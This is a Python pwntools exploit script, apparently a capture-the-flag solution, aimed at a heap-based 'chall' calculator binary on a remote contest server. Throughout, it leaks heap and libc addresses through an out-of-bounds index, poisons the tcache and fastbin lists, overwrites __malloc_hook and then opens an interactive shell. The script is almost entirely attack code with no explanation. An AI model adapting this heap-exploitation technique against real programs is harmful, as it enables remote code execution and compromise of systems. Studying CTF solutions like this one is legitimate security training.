from pwn import *
import re


elf = ELF("./chall")
context.arch = 'amd64'

def get_numbers(num, val):
    p.sendlineafter(">",str(1))
    p.sendlineafter(">",str(num))
    for i in val:
        p.sendline(str(i))

def print_average(idx):
    p.sendlineafter(">",str(2))
    p.sendlineafter(">",str(idx))
    return p.recvuntil("---")

def delete_numbers(idx):
    p.sendlineafter(">",str(3))
    p.sendlineafter(">",str(idx))

if args.REM:
    p = remote("tcalc.forfuture.fluxfingers.net",1337)
    libc = ELF("./libc.so.6")
else:
    p = process("./chall")
    libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.29.so")
    gdb.attach(p,"""

            """)
#LEAK
offset_numbers = (0x000055555555a2d0-0x555555559260)//8
offset_libc = (0x55555555b360-0x555555559260)//8 +1

main_arena_offset = 0x1e4c40
main_arena = 0x1c09e0
for addr in libc.search("sh"):
    if addr%8 == 0:
        binsh = addr


for i in range(10):
    get_numbers(2,[2,2])
for i in range(10):
    delete_numbers(i)
#heap leak
leak_offset = offset_numbers + 36 #offset to last fastbin bin which points to previously freed bin head which has leak
leak = print_average(leak_offset)
heap = int(re.findall(r'\d+',leak)[0])*2 - 0x13c0 #heap base addr
info("Heap Base %s"%hex(heap))

#Leaking LIBC 
#get a unsorted bin
get_numbers(500,['a']) #1
get_numbers(2,[heap+0x13a0,2]) #2
delete_numbers(0)
print(offset_libc)
libc_leak = print_average(offset_libc)
libc_main_arena = int(re.findall(r'\d+',libc_leak)[0])*2-0xfb0 #main_arena +96
libc_main_arena = libc_main_arena - 96
libc_base = libc_main_arena - main_arena_offset
info("Libc Base %s"%hex(libc_base))

#clean up the heap
delete_numbers(1)


get_numbers(2,[2, heap+0x13c0])
get_numbers(2,[0x71,0x71])
get_numbers(0x60//8,[0x21 for i in range(0x60//8)] )

#Fill up tcache 0x60
for i in range(7):
    get_numbers(0x60/8,['a'])
    delete_numbers(3)

delete_numbers(2)
delete_numbers((0x55555555b370-0x555555559260)/8)

get_numbers(12, [0x71,libc_base +libc.symbols['__malloc_hook'] - 0x23] +[0]*10)
get_numbers(12,[0]*12)
get_numbers(12,[0x71, -2285610601545728, 0x7f] +[0x0]*9)
raw_input("")
p.sendlineafter(">",str(1))
p.sendlineafter(">",str((libc_base+binsh)//8-1))

p.interactive()
